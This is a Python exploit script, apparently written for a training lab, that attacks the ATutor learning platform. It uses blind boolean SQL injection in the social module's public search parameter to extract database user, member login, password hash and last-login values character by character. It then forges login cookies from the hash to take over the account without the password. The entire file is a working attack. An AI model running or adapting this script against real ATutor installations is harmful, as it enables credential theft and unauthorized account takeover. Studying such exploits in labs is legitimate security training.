import sys
import re
import requests
import hashlib
from bs4 import BeautifulSoup

ascii_list = list(range(48,57)) + list(range(97, 123)) + list(range(32,48)) + list(range(57,64)) + list(range(90,97)) + list(range(123,127)) + list(range(64,90))
# List of characters in (rough) order of frequency
# Numbers, small letters, punctuation, big letters (from 32 to 127)

def searchFriends_sqli(ip, inj_str):
    target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str)
    r = requests.get(target)
    s = BeautifulSoup(r.text, 'lxml')

    content_length = int(r.headers['Content-Length'])

    if content_length == 20:
        return False 
    else:
        return True

def extract_data(ip, inj):
    template = "test')/**/or/**/(ascii(substring((select/**/CURRENT_USER()),<num>,1)))=<inj>%23"

    output = "" # If we already have stuff, can start output with value and change starting i
    for i in range(1,100):
        new_character = False
        for c in ascii_list: # ASCII letters, numbers and punctuation
            query_string = f"test')/**/or/**/(ascii(substring(({inj}),{i},1)))={c}%23"
            res = searchFriends_sqli(ip, query_string)
            print(f"Checking {chr(c)}: {query_string} -- {res}")
            if res == True:
                new_character = True
                output += chr(c)
                print(f"Success, adding {chr(c)} -- {output}")
                break
        if not new_character:
            print("No possible characters, breaking now!")
            break
    print(f"Extracted data: {output}")
    return output

def login(ip, username, user_hash, user_lastlogin):
    target = f"http://{ip}//ATutor/login.php"

    lastlogin_hash = hashlib.sha512((user_lastlogin).encode('utf-8')).hexdigest()
    hashed = hashlib.sha512((user_hash +  lastlogin_hash).encode('utf-8')).hexdigest() 

    cookies = {
        'ATLogin': username,
        'ATPass': hashed
    }

    s = requests.Session()
    r = s.post(target, cookies=cookies)
    res = r.text

    if re.search("Invalid login/password combination.",res):
        return False
    return True

def main():
    if len(sys.argv) != 2:
        print ("(+) usage: %s <target>" % sys.argv[0])
        print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]

    member_username_injection_string = "select/**/login/**/FROM/**/AT_members"
    # member_username = extract_data(ip, member_username_injection_string)
    member_username = "teacher"

    memeber_password_injection_string = f"select/**/password/**/FROM/**/AT_members/**/WHERE/**/login=\"{member_username}\""
    # member_hash = extract_data(ip, memeber_password_injection_string)
    member_hash = "8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e"

    member_lastlogin_injection_string = f"select/**/last_login/**/FROM/**/AT_members/**/WHERE/**/login=\"{member_username}\""
    # member_lastlogin = extract_data(ip, member_lastlogin_injection_string)
    member_lastlogin = "2023-11-30 09:59:20"

    print(f"Extracted Credentials: {member_username}, {member_hash}")
    print(f"Extracted Last Login: {member_username}, {member_lastlogin}")

    print(login(ip, member_username, member_hash, member_lastlogin))

if __name__ == "__main__":
    main()